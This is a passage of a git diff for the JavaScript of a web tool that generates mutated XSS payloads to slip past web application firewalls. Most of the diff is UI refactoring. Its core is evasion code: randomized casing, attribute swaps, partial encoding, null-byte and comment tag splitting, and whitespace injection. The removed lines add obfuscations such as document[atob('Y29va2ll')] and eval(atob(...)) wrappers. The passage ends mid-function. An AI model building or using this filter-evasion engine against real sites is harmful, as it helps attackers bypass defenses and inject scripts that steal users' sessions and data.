@@ -3,734 +3,937 @@
  * For educational purposes only
  */
 
-// DOM Elements
-const originalPayloadEl = document.getElementById('original-payload');
-const mutateBtn = document.getElementById('mutate-btn');
-const copyAllBtn = document.getElementById('copy-all-btn');
-const mutationsList = document.getElementById('mutations-list');
-const mutationCount = document.getElementById('mutation-count');
+// Initialize event listeners and theme
+document.addEventListener('DOMContentLoaded', () => {
+    initTheme();
+    initFloatingParticles();
+    
+    // Initialize DOM element references after the DOM is fully loaded
+    const originalPayloadEl = document.getElementById('base-payload'); 
+    const mutateBtn = document.getElementById('mutate-btn');
+    const copyAllBtn = document.getElementById('copy-all-btn');
+    const mutationsList = document.getElementById('mutations-list');
+    const mutationCount = document.getElementById('mutation-count');
+    const themeToggle = document.getElementById('theme-toggle-btn');
+    const iterateBtn = document.getElementById('iterate-btn');
 
-// Real-time engine elements
-const wafTypeEl = document.getElementById('waf-type');
-const payloadIntentEl = document.getElementById('payload-intent');
-const aggressivenessEl = document.getElementById('ai-aggressiveness');
-const realtimeGenerateBtn = document.getElementById('realtime-generate-btn');
-const realtimeResultEl = document.getElementById('realtime-result');
-const wafAnalysisEl = document.getElementById('waf-analysis');
+    // Real-time engine elements
+    const wafTypeEl = document.getElementById('waf-type');
+    const payloadIntentEl = document.getElementById('payload-intent');
+    const aggressivenessEl = document.getElementById('ai-aggressiveness');
+    const realtimeGenerateBtn = document.getElementById('realtime-generate-btn');
+    const realtimeResultEl = document.getElementById('realtime-result');
+    const wafAnalysisEl = document.getElementById('waf-analysis').querySelector('.analysis-content');
+    
+    // Add event listeners
+    mutateBtn.addEventListener('click', () => startMutation(originalPayloadEl, mutationsList, mutationCount));
+    copyAllBtn.addEventListener('click', copyAllMutations);
+    themeToggle.addEventListener('click', toggleTheme);
+    iterateBtn.addEventListener('click', () => continueIteration(originalPayloadEl, mutationsList));
+    
+    // Add event listener for realtime generation if the element exists
+    if (realtimeGenerateBtn) {
+        realtimeGenerateBtn.addEventListener('click', () => {
+            generateRealtimePayloads(wafTypeEl, payloadIntentEl, aggressivenessEl, realtimeResultEl, wafAnalysisEl);
+        });
+    }
+    
+    // Initialize tooltips
+    initTooltips();
+    
+    // Initialize new enhancements
+    enhanceAccessibility();
+    handleOfflineStatus();
+    
+    // Auto-focus the base payload input
+    if (originalPayloadEl) {
+        originalPayloadEl.focus();
+    }
+    
+    // Add viewport height fix for mobile browsers
+    setVhProperty();
+    window.addEventListener('resize', setVhProperty);
+});
 
-// Utility Functions
-const escapeHTML = (str) => {
+/**
+ * Theme functions
+ */
+function initTheme() {
+    const savedTheme = localStorage.getItem('theme') || 'light';
+    document.body.setAttribute('data-theme', savedTheme);
+    updateThemeToggleIcon(savedTheme);
+}
+
+function toggleTheme() {
+    const currentTheme = document.body.getAttribute('data-theme');
+    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+    
+    document.body.setAttribute('data-theme', newTheme);
+    localStorage.setItem('theme', newTheme);
+    updateThemeToggleIcon(newTheme);
+    
+    // Add a subtle animation to make the transition nicer
+    document.body.classList.add('theme-transition');
+    setTimeout(() => {
+        document.body.classList.remove('theme-transition');
+    }, 500);
+}
+
+function updateThemeToggleIcon(theme) {
+    const lightIcon = document.getElementById('theme-light-icon');
+    const darkIcon = document.getElementById('theme-dark-icon');
+    
+    if (lightIcon && darkIcon) {
+        if (theme === 'dark') {
+            lightIcon.classList.add('hidden');
+            darkIcon.classList.remove('hidden');
+        } else {
+            lightIcon.classList.remove('hidden');
+            darkIcon.classList.add('hidden');
+        }
+    }
+}
+
+/**
+ * Initialize floating particles in the header
+ */
+function initFloatingParticles() {
+    const particlesContainer = document.querySelector('.floating-particles');
+    if (!particlesContainer) return;
+    
+    // Create multiple particles
+    for (let i = 0; i < 5; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = `${Math.random() * 10 + 5}px`;
+        particle.style.height = particle.style.width;
+        particle.style.top = `${Math.random() * 80}%`;
+        particle.style.left = `${Math.random() * 80}%`;
+        particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
+        particle.style.animationDelay = `${Math.random() * 5}s`;
+        particlesContainer.appendChild(particle);
+    }
+}
+
+/**
+ * Initialize tooltips for feature explanation
+ */
+function initTooltips() {
+    const tooltips = document.querySelectorAll('.feature-tooltip');
+    tooltips.forEach(tooltip => {
+        if (!tooltip.hasAttribute('data-tooltip')) {
+            const featureId = tooltip.previousElementSibling?.getAttribute('for');
+            if (featureId) {
+                tooltip.setAttribute('data-tooltip', getTooltipText(featureId));
+            }
+        }
+    });
+}
+
+/**
+ * Get tooltip text for specific features
+ */
+function getTooltipText(featureId) {
+    const tooltipTexts = {
+        'polyglot-mode': 'Generates payloads that work in multiple contexts simultaneously',
+        'signature-evasion': 'Modifies payloads to avoid common WAF signature detection patterns',
+        'context-aware': 'Adapts payload encoding based on its insertion context',
+        'entropy-injection': 'Adds controlled randomness to evade pattern matching algorithms',
+        'case-randomization': 'Randomizes letter casing to bypass case-sensitive filters',
+        'attribute-obfuscation': 'Replaces HTML attributes with equivalent alternatives',
+        'html-encoding': 'Uses HTML entity encoding to hide malicious characters',
+        'js-encoding': 'Applies JavaScript escape sequences to disguise code',
+        'url-encoding': 'Converts characters to URL-encoded format to bypass filters',
+        'whitespace-injection': 'Adds strategic whitespace to confuse WAF parsers',
+        'tag-splitting': 'Splits HTML tags using various techniques to evade detection',
+        'comment-injection': 'Inserts HTML comments to break pattern matching'
+    };
+    
+    return tooltipTexts[featureId] || 'Feature explanation';
+}
+
+/**
+ * Enhanced accessibility for interactive elements
+ */
+function enhanceAccessibility() {
+    // Add ARIA roles and states to interactive elements
+    const mutationItems = document.querySelectorAll('.mutation-item');
+    mutationItems.forEach((item, index) => {
+        item.setAttribute('role', 'region');
+        item.setAttribute('aria-label', `Mutation ${index + 1}`);
+    });
+
+    // Make sure all copy buttons have proper ARIA attributes
+    const copyButtons = document.querySelectorAll('.copy-btn');
+    copyButtons.forEach(btn => {
+        btn.setAttribute('role', 'button');
+        btn.setAttribute('aria-pressed', 'false');
+        
+        btn.addEventListener('click', () => {
+            // Toggle aria-pressed state temporarily when clicked
+            btn.setAttribute('aria-pressed', 'true');
+            setTimeout(() => {
+                btn.setAttribute('aria-pressed', 'false');
+            }, 2000);
+        });
+    });
+
+    // Enable keyboard navigation between mutations
+    mutationItems.forEach((item, index) => {
+        item.setAttribute('tabindex', '0');
+        item.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowDown' && index < mutationItems.length - 1) {
+                e.preventDefault();
+                mutationItems[index + 1].focus();
+            } else if (e.key === 'ArrowUp' && index > 0) {
+                e.preventDefault();
+                mutationItems[index - 1].focus();
+            }
+        });
+    });
+}
+
+/**
+ * Performance optimization for image loading
+ */
+function optimizeImageLoading() {
+    // This would apply if we had images in the app
+    const images = document.querySelectorAll('img[loading="lazy"]');
+    if ('IntersectionObserver' in window) {
+        const imageObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const img = entry.target;
+                    img.src = img.dataset.src;
+                    imageObserver.unobserve(img);
+                }
+            });
+        });
+        
+        images.forEach(img => imageObserver.observe(img));
+    } else {
+        // Fallback for browsers that don't support IntersectionObserver
+        images.forEach(img => {
+            img.src = img.dataset.src;
+        });
+    }
+}
+
+/**
+ * Handle offline status gracefully
+ */
+function handleOfflineStatus() {
+    window.addEventListener('online', updateOnlineStatus);
+    window.addEventListener('offline', updateOnlineStatus);
+    
+    function updateOnlineStatus() {
+        const statusElement = document.createElement('div');
+        statusElement.className = 'connection-status';
+        
+        if (navigator.onLine) {
+            statusElement.textContent = 'Back online';
+            statusElement.classList.add('online');
+            setTimeout(() => statusElement.remove(), 3000);
+        } else {
+            statusElement.textContent = 'You are offline. Some features may be limited.';
+            statusElement.classList.add('offline');
+        }
+        
+        document.body.appendChild(statusElement);
+    }
+}
+
+/**
+ * Fix for mobile viewport height issues
+ */
+function setVhProperty() {
+    // Set a CSS custom property based on the actual viewport height
+    // This helps with mobile browsers where the address bar can affect viewport height
+    const vh = window.innerHeight * 0.01;
+    document.documentElement.style.setProperty('--vh', `${vh}px`);
+}
+
+/**
+ * Mutation functions - each returns a modified version of the payload
+ */
+function caseRandomization(payload) {
+    return payload.split('').map(char => {
+        return Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase();
+    }).join('');
+}
+
+function attributeObfuscation(payload) {
+    // Add proper attribute obfuscation logic
+    if (!payload.includes('<') || !payload.includes('>')) return payload;
+    
+    // Replace common attributes with equivalent but less detected variants
+    const attributeMutations = {
+        'onclick': ['onmousedown', 'onpointerdown'],
+        'onload': ['onreadystatechange', 'ondocumentready'],
+        'onerror': ['onabort', 'ontimeout'],
+        'src=': ['data=', 'href='],
+        'href=': ['src=', 'action=']
+    };
+    
+    let result = payload;
+    for (const [attr, alternatives] of Object.entries(attributeMutations)) {
+        if (result.toLowerCase().includes(attr)) {
+            const alternative = alternatives[Math.floor(Math.random() * alternatives.length)];
+            // Use case-preserving replacement
+            const regex = new RegExp(attr, 'i');
+            result = result.replace(regex, alternative);
+        }
+    }
+    
+    // Add random attributes to tags to change signatures
+    if (Math.random() > 0.5 && result.includes('<')) {
+        const randomAttrs = ['tabindex="0"', 'role="none"', 'aria-hidden="true"', 'data-xss="1"'];
+        const randomAttr = randomAttrs[Math.floor(Math.random() * randomAttrs.length)];
+        result = result.replace(/<([a-z]+)(\s|>)/i, `<$1 ${randomAttr}$2`);
+    }
+    
+    return result;
+}
+
+function htmlEncoding(payload) {
+    // HTML entity encoding
+    const entities = [
+        { regex: /</g, replace: '&lt;' },
+        { regex: />/g, replace: '&gt;' },
+        { regex: /"/g, replace: '&quot;' },
+        { regex: /'/g, replace: '&#39;' },
+        { regex: /&/g, replace: '&amp;' }
+    ];
+    
+    // Only encode some of the entities randomly
+    const result = payload.split('');
+    for (let i = 0; i < result.length; i++) {
+        for (const entity of entities) {
+            if (entity.regex.test(result[i]) && Math.random() > 0.5) {
+                result[i] = result[i].replace(entity.regex, entity.replace);
+                break;
+            }
+        }
+    }
+    
+    return result.join('');
+}
+
+function jsEncoding(payload) {
+    // Convert characters to JS escape sequences
+    const result = payload.split('');
+    for (let i = 0; i < result.length; i++) {
+        // Only encode some characters randomly
+        if (Math.random() > 0.6) {
+            const char = result[i];
+            const code = char.charCodeAt(0);
+            // Use different JS encoding techniques randomly
+            const encodingType = Math.floor(Math.random() * 3);
+            
+            switch (encodingType) {
+                case 0: // Hex encoding
+                    result[i] = `\\x${code.toString(16).padStart(2, '0')}`;
+                    break;
+                case 1: // Unicode encoding
+                    result[i] = `\\u${code.toString(16).padStart(4, '0')}`;
+                    break;
+                case 2: // Octal encoding
+                    result[i] = `\\${code.toString(8)}`;
+                    break;
+            }
+        }
+    }
+    
+    return result.join('');
+}
+
+function urlEncoding(payload) {
+    // Convert some characters to URL encoding format
+    const result = payload.split('');
+    for (let i = 0; i < result.length; i++) {
+        // Only encode some characters randomly
+        if (Math.random() > 0.6) {
+            const char = result[i];
+            const code = char.charCodeAt(0);
+            result[i] = `%${code.toString(16).padStart(2, '0')}`;
+        }
+    }
+    
+    return result.join('');
+}
+
+function whitespaceInjection(payload) {
+    if (!payload.includes('<') || !payload.includes('>')) return payload;
+    
+    // Add random whitespace in strategic places
+    let result = payload;
+    
+    // Add space after < in tags
+    result = result.replace(/<([a-z]+)/gi, (match, tag) => {
+        return `<${" \t\n".charAt(Math.floor(Math.random() * 3))}${tag}`;
+    });
+    
+    // Add space before attributes
+    result = result.replace(/\s([a-z]+)=/gi, (match, attr) => {
+        return `${" \t\n".charAt(Math.floor(Math.random() * 3))}${attr}=`;
+    });
+    
+    // Add space before closing >
+    result = result.replace(/([^-])\s?>/g, (match, prev) => {
+        return `${prev}${" \t\n".charAt(Math.floor(Math.random() * 3))}>`;
+    });
+    
+    return result;
+}
+
+function tagSplitting(payload) {
+    if (!payload.includes('<script') && !payload.includes('<img')) return payload;
+    
+    // Split tags with techniques like comments or null chars
+    const replacements = [
+        { from: '<script', to: '<scr\x00ipt' },
+        { from: '<script', to: '<scr\x09ipt' },
+        { from: '<script', to: '<scr<!---->ipt' },
+        { from: '<img', to: '<i\x00mg' },
+        { from: '<img', to: '<i<!---->mg' },
+        { from: 'javascript:', to: 'java\x00script:' },
+        { from: 'javascript:', to: 'java<!---->script:' }
+    ];
+    
+    const randomReplacement = replacements[Math.floor(Math.random() * replacements.length)];
+    return payload.replace(randomReplacement.from, randomReplacement.to);
+}
+
+function commentInjection(payload) {
+    if (!payload.includes('<') || !payload.includes('>')) return payload;
+    
+    // Insert HTML comments in strategic places
+    const result = payload.replace(/(<[^>]+)([^<>]+)/g, (match, start, rest) => {
+        if (Math.random() > 0.5) {
+            return `${start}<!--random${Math.random().toString(36).substring(2, 8)}-->${rest}`;
+        }
+        return match;
+    });
+    
+    return result;
+}
+
+/**
+ * Highlight syntax in XSS payloads for better readability
+ */
+function highlightSyntax(html) {
+    // Add color highlighting for different parts of the payload
+    return html
+        // Highlight tags
+        .replace(/(&lt;[\/]?[a-z][a-z0-9]*)/gi, '<span class="syntax-tag">$1</span>')
+        // Highlight attributes
+        .replace(/([a-z-]+)=["']?([^"'< >]*)/gi, '<span class="syntax-attr">$1</span>=<span class="syntax-string">"$2"</span>')
+        // Highlight script content
+        .replace(/(&gt;)([^&]*)(&lt;\/script&gt;)/gi, '$1<span class="syntax-script">$2</span>$3')
+        // Highlight closing brackets
+        .replace(/(&gt;)/g, '<span class="syntax-tag">$1</span>')
+        // Highlight JavaScript keywords
+        .replace(/(alert|document|window|location|eval|setTimeout|setInterval|fetch|XMLHttpRequest)\b/g, 
+                 '<span class="syntax-keyword">$1</span>');
+}
+
+/**
+ * Generate a unique mutation by applying a random set of mutation techniques
+ */
+function generateMutation(basePayload) {
+    // Get all selected mutation techniques
+    const techniques = [
+        { id: 'case-randomization', fn: caseRandomization },
+        { id: 'attribute-obfuscation', fn: attributeObfuscation },
+        { id: 'html-encoding', fn: htmlEncoding },
+        { id: 'js-encoding', fn: jsEncoding },
+        { id: 'url-encoding', fn: urlEncoding },
+        { id: 'whitespace-injection', fn: whitespaceInjection },
+        { id: 'tag-splitting', fn: tagSplitting },
+        { id: 'comment-injection', fn: commentInjection }
+    ].filter(t => document.getElementById(t.id).checked);
+    
+    // If no techniques selected, return the base payload
+    if (techniques.length === 0) return basePayload;
+    
+    // Apply 1-3 random mutation techniques
+    let mutatedPayload = basePayload;
+    const numTechniques = Math.floor(Math.random() * 3) + 1;
+    const shuffledTechniques = [...techniques].sort(() => Math.random() - 0.5);
+    
+    for (let i = 0; i < Math.min(numTechniques, shuffledTechniques.length); i++) {
+        mutatedPayload = shuffledTechniques[i].fn(mutatedPayload);
+    }
+    
+    return mutatedPayload;
+}
+
+/**
+ * Generate multiple unique mutations
+ */
+function generateMutations(basePayload, count) {
+    if (!basePayload) return [];
+    
+    const mutations = new Set();
+    const attempts = count * 2; // Try more times to ensure uniqueness
+    
+    for (let i = 0; i < attempts && mutations.size < count; i++) {
+        const mutation = generateMutation(basePayload);
+        if (mutation !== basePayload) {
+            mutations.add(mutation);
+        }
+    }
+    
+    return [...mutations].slice(0, count);
+}
+
+/**
+ * Start the mutation process with the given payload
+ */
+function startMutation(originalPayloadEl, mutationsList, mutationCount) {
+    const basePayload = originalPayloadEl.value.trim();
+    if (!basePayload) {
+        alert('Please enter a base XSS payload');
+        return;
+    }
+    
+    // Clear previous mutations
+    mutationsList.innerHTML = '';
+    
+    // Get the number of mutations to generate
+    const numMutations = parseInt(mutationCount.value, 10);
+    
+    // Generate and display mutations
+    const generatedMutations = [];
+    for (let i = 0; i < numMutations; i++) {
+        const mutation = generateMutation(basePayload);
+        if (!generatedMutations.includes(mutation)) {
+            generatedMutations.push(mutation);
+            displayMutation(mutation, i + 1, mutationsList);
+        } else {
+            // If we got a duplicate, try again
+            i--;
+        }
+    }
+}
+
+/**
+ * Display a mutation in the mutations list
+ */
+function displayMutation(mutation, index, mutationsList) {
+    const mutationEl = document.createElement('div');
+    mutationEl.className = 'mutation-item';
+    mutationEl.setAttribute('tabindex', '0'); // Make items keyboard navigable
+    
+    // UI improvement: add fade-in effect for modern transition
+    mutationEl.classList.add('fade-in');
+    setTimeout(() => mutationEl.classList.remove('fade-in'), 500);
+    
+    // UI improvement: allow selecting a mutation when clicked (ignoring clicks on inner copy button)
+    mutationEl.addEventListener('click', (e) => {
+        if (e.target.closest('.copy-btn')) return;
+        document.querySelectorAll('.mutation-item').forEach(item => item.classList.remove('selected'));
+        mutationEl.classList.add('selected');
+    });
+    
+    // UI improvement: Add keyboard support
+    mutationEl.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            document.querySelectorAll('.mutation-item').forEach(item => item.classList.remove('selected'));
+            mutationEl.classList.add('selected');
+        }
+    });
+    
+    mutationEl.innerHTML = `
+        <div class="mutation-header">
+            <span class="mutation-number">#${index}</span>
+            <div class="mutation-tags">
+                <span class="mutation-tag">XSS</span>
+                ${mutation.length > 50 ? '<span class="mutation-tag size-tag">Large</span>' : ''}
+                ${mutation.includes('script') ? '<span class="mutation-tag script-tag">Script</span>' : ''}
+            </div>
+            <button class="copy-btn" data-mutation="${encodeURIComponent(mutation)}" aria-label="Copy mutation ${index}">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75" />
+                </svg>
+                Copy
+            </button>
+        </div>
+        <div class="mutation-content">${highlightSyntax(escapeHtml(mutation))}</div>
+    `;
+    
+    mutationsList.appendChild(mutationEl);
+    
+    // Add copy event listener
+    const copyBtn = mutationEl.querySelector('.copy-btn');
+    copyBtn.addEventListener('click', () => {
+        const mutationText = decodeURIComponent(copyBtn.dataset.mutation);
+        copyToClipboard(mutationText);
+        showCopySuccess(copyBtn);
+    });
+}
+
+/**
+ * Safely escape HTML to prevent XSS in the UI
+ */
+function escapeHtml(str) {
     return str
         .replace(/&/g, '&amp;')
         .replace(/</g, '&lt;')
         .replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;')
         .replace(/'/g, '&#039;');
-};
+}
 
-const copyToClipboard = (text) => {
-    navigator.clipboard.writeText(text).then(
-        () => {
-            showCopySuccess();
-        },
-        (err) => {
-            console.error('Failed to copy text: ', err);
+/**
+ * Copy text to clipboard
+ */
+function copyToClipboard(text) {
+    // First try using the modern clipboard API
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text)
+            .then(() => {
+                console.log('Text copied to clipboard successfully');
+            })
+            .catch(err => {
+                console.error('Failed to copy: ', err);
+                fallbackCopyToClipboard(text);
+            });
+    } else {
+        // Fallback method for browsers that don't support clipboard API
+        fallbackCopyToClipboard(text);
+    }
+}
+
+/**
+ * Fallback method for copying text to clipboard
+ */
+function fallbackCopyToClipboard(text) {
+    try {
+        const textArea = document.createElement('textarea');
+        textArea.value = text;
+        
+        // Make the textarea out of viewport
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        
+        // Select and copy
+        textArea.focus();
+        textArea.select();
+        const successful = document.execCommand('copy');
+        
+        // Clean up
+        document.body.removeChild(textArea);
+        
+        if (!successful) {
+            console.error('Failed to copy text with fallback method');
         }
-    );
-};
+    } catch (err) {
+        console.error('Fallback copy method failed: ', err);
+    }
+}
 
-const showCopySuccess = () => {
-    // Create and show a temporary floating message
-    const message = document.createElement('div');
-    message.textContent = 'Copied to clipboard!';
-    message.style.position = 'fixed';
-    message.style.bottom = '20px';
-    message.style.right = '20px';
-    message.style.padding = '10px 20px';
-    message.style.background = 'var(--primary)';
-    message.style.color = 'white';
-    message.style.borderRadius = 'var(--radius-md)';
-    message.style.boxShadow = 'var(--shadow-md)';
-    message.style.zIndex = '1000';
-    message.style.opacity = '0';
-    message.style.transform = 'translateY(10px)';
-    message.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+/**
+ * Show success message after copying
+ */
+function showCopySuccess(btn) {
+    const originalHTML = btn.innerHTML;
+    // UI improvement: add a visual feedback class
+    btn.classList.add('copy-success');
+    btn.innerHTML = `
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+        </svg>
+        Copied!
+    `;
+    btn.classList.add('copied');
     
-    document.body.appendChild(message);
-    
-    // Trigger animation
     setTimeout(() => {
-        message.style.opacity = '1';
-        message.style.transform = 'translateY(0)';
-    }, 10);
-    
-    // Remove after 2 seconds
-    setTimeout(() => {
-        message.style.opacity = '0';
-        message.style.transform = 'translateY(10px)';
-        setTimeout(() => document.body.removeChild(message), 300);
+        btn.innerHTML = originalHTML;
+        btn.classList.remove('copied');
+        btn.classList.remove('copy-success');
     }, 2000);
-};
+}
 
-// Mutation Functions
-const generateMutations = (payload) => {
-    if (!payload.trim()) {
-        showError('Please enter a valid payload');
-        return [];
-    }
-    
-    const count = parseInt(mutationCount.value, 10);
-    const mutations = [];
-    
-    // Get selected mutation techniques
-    const useCaseVariations = document.getElementById('mut-case').checked;
-    const useHtmlEncoding = document.getElementById('mut-encoding').checked;
-    const useTagVariations = document.getElementById('mut-tags').checked;
-    const useQuoteVariations = document.getElementById('mut-quotes').checked;
-    const useSpaceVariations = document.getElementById('mut-spaces').checked;
-    const useObfuscation = document.getElementById('mut-obfuscation').checked;
-    
-    // Generate mutations based on selected techniques
-    for (let i = 0; i < count; i++) {
-        let mutated = payload;
-        
-        // Apply selected mutation techniques
-        if (useCaseVariations) mutated = applyCaseVariation(mutated, i);
-        if (useHtmlEncoding) mutated = applyHtmlEncoding(mutated, i);
-        if (useTagVariations) mutated = applyTagVariation(mutated, i);
-        if (useQuoteVariations) mutated = applyQuoteVariation(mutated, i);
-        if (useSpaceVariations) mutated = applySpaceVariation(mutated, i);
-        if (useObfuscation) mutated = applyObfuscation(mutated, i);
-        
-        mutations.push(mutated);
-    }
-    
-    return [...new Set(mutations)]; // Remove duplicates
-};
-
-const applyCaseVariation = (payload, seed) => {
-    // Mix uppercase and lowercase characters
-    if (seed % 3 === 0) {
-        return payload.replace(/[a-zA-Z]/g, (char) => 
-            Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase()
-        );
-    } else if (seed % 3 === 1) {
-        return payload.replace(/script/gi, (match) => 
-            match.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('')
-        );
-    } else {
-        return payload.replace(/alert|confirm|prompt|eval|document|window/gi, (match) => 
-            match.split('').map((c, i) => i % 2 === 1 ? c.toUpperCase() : c.toLowerCase()).join('')
-        );
-    }
-};
-
-const applyHtmlEncoding = (payload, seed) => {
-    const encodings = [
-        // HTML entity encoding
-        { from: '<', to: '&lt;' },
-        { from: '>', to: '&gt;' },
-        // URL encoding
-        { from: '<', to: '%3C' },
-        { from: '>', to: '%3E' },
-        // Hex encoding
-        { from: '<', to: '&#x3c;' },
-        { from: '>', to: '&#x3e;' },
-        // Unicode
-        { from: '<', to: '\\u003c' },
-        { from: '>', to: '\\u003e' },
-    ];
-    
-    // Only encode some characters based on seed
-    if (seed % 3 === 0) {
-        return payload
-            .replace(/</g, encodings[seed % 3 * 2].to)
-            .replace(/>/g, encodings[seed % 3 * 2 + 1].to);
-    } else if (seed % 3 === 1) {
-        return payload
-            .replace(/document/g, 'd\\u006fcument')
-            .replace(/window/g, 'win\\u0064ow');
-    } else {
-        return payload
-            .replace(/alert/g, 'al\\u0065rt')
-            .replace(/eval/g, '\\u0065val');
-    }
-};
-
-const applyTagVariation = (payload, seed) => {
-    const tagVariations = [
-        { from: '<script', to: '<sCrIpT' },
-        { from: '<script', to: '<ScRiPt' },
-        { from: '<script', to: '<svg/onload' },
-        { from: '<script', to: '<img/onerror' },
-        { from: '<script', to: '<iframe/onload' },
-        { from: '<script', to: '<div/onmouseover' },
-    ];
-    
-    const selectedVariation = tagVariations[seed % tagVariations.length];
-    return payload.replace(new RegExp(selectedVariation.from, 'gi'), selectedVariation.to);
-};
-
-const applyQuoteVariation = (payload, seed) => {
-    const quoteVariations = [
-        { from: '"', to: "'" },
-        { from: "'", to: "`" },
-        { from: '"', to: "`" },
-        { from: "'", to: '"' },
-    ];
-    
-    if (seed % 2 === 0) {
-        const selectedVariation = quoteVariations[seed % quoteVariations.length];
-        return payload.replace(new RegExp(selectedVariation.from, 'g'), selectedVariation.to);
-    } else {
-        // Try to replace quoted event handler
-        return payload.replace(/on\w+="([^"]+)"/g, (match, p1) => `on${match.split('=')[0].substring(2)}='${p1}'`);
-    }
-};
-
-const applySpaceVariation = (payload, seed) => {
-    const spaceVariations = [
-        { from: ' ', to: '\t' },
-        { from: ' ', to: '\n' },
-        { from: ' ', to: '\r' },
-        { from: ' ', to: '+' },
-        { from: ' ', to: '%20' },
-        { from: ' ', to: '/**/'},
-    ];
-    
-    if (seed % 3 === 0) {
-        const selectedVariation = spaceVariations[seed % spaceVariations.length];
-        return payload.replace(/ /g, selectedVariation.to);
-    } else if (seed % 3 === 1) {
-        // Remove spaces between certain elements
-        return payload.replace(/> </g, '><');
-    } else {
-        // Add extra spaces
-        return payload.replace(/([=:;])/g, ' $1 ');
-    }
-};
-
-const applyObfuscation = (payload, seed) => {
-    const obfuscations = [
-        { from: 'alert', to: 'a\u200Blert'},
-        { from: 'alert', to: '(alert)'},
-        { from: 'alert', to: '["ale"+"rt"]'},
-        { from: 'alert', to: 'window["al"+"ert"]'},
-        { from: 'document.cookie', to: 'document["cookie"]'},
-        { from: 'document.cookie', to: 'document[atob("Y29va2ll")]'},
-        { from: 'alert(', to: 'setTimeout("alert("},
-        { from: 'eval(', to: '[].find.constructor("eval($1)")()'}
-    ];
-    
-    if (seed % 4 === 0) {
-        const selectedObfuscation = obfuscations[seed % obfuscations.length];
-        return payload.replace(new RegExp(selectedObfuscation.from, 'g'), selectedObfuscation.to);
-    } else if (seed % 4 === 1) {
-        // Base64 encode certain parts
-        return payload.replace(/(alert\([^)]+\))/g, (match) => {
-            return `eval(atob('${btoa(match)}'))`;
-        });
-    } else if (seed % 4 === 2) {
-        // JavaScript Unicode escaping
-        return payload.replace(/[a-z]{4,8}/gi, (match) => {
-            if (['alert', 'eval', 'document', 'cookie', 'window'].includes(match.toLowerCase())) {
-                return match.split('').map(c => `\\u${('000' + c.charCodeAt(0).toString(16)).slice(-4)}`).join('');
-            }
-            return match;
-        });
-    } else {
-        // Comment insertion
-        return payload.replace(/([=:(])/g, '$1/*random*/');
-    }
-};
-
-// Display Functions
-const displayMutations = (mutations) => {
-    if (!mutations.length) {
-        mutationsList.innerHTML = '<p class="empty-message">No mutations generated. Try a different payload.</p>';
+/**
+ * Copy all mutations to the clipboard
+ */
+function copyAllMutations() {
+    const mutations = document.querySelectorAll('.mutation-content');
+    if (mutations.length === 0) {
+        alert('No mutations to copy');
         return;
     }
     
-    mutationsList.innerHTML = '';
+    const allMutations = Array.from(mutations).map(el => el.textContent).join('\n\n');
+    copyToClipboard(allMutations);
     
-    mutations.forEach((mutation, index) => {
-        const item = document.createElement('div');
-        item.className = 'mutation-item';
-        
-        // Create pre element for the payload
-        const pre = document.createElement('pre');
-        pre.textContent = mutation;
-        
-        // Create copy button
-        const copyBtn = document.createElement('button');
-        copyBtn.className = 'copy-mutation';
-        copyBtn.innerHTML = `
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
-                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
-            </svg>
-        `;
-        copyBtn.title = "Copy to clipboard";
-        copyBtn.onclick = (e) => {
-            e.stopPropagation();
-            copyToClipboard(mutation);
-        };
-        
-        // Append elements
-        item.appendChild(pre);
-        item.appendChild(copyBtn);
-        mutationsList.appendChild(item);
-    });
-};
+    const copyAllBtn = document.getElementById('copy-all-btn');
+    showCopySuccess(copyAllBtn);
+}
 
-const showError = (message) => {
-    const errorEl = document.createElement('div');
-    errorEl.className = 'error-message';
-    errorEl.innerHTML = `
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <circle cx="12" cy="12" r="10"/>
-            <line x1="12" y1="8" x2="12" y2="12"/>
-            <line x1="12" y1="16" x2="12" y2="16"/>
-        </svg>
-        ${message}
-    `;
+/**
+ * Continue iterating mutations with the selected mutation as the new base
+ */
+function continueIteration(originalPayloadEl, mutationsList) {
+    const selected = document.querySelector('.mutation-item.selected');
+    if (!selected) {
+        alert('Please select a mutation to iterate on by clicking on it');
+        return;
+    }
     
-    mutationsList.innerHTML = '';
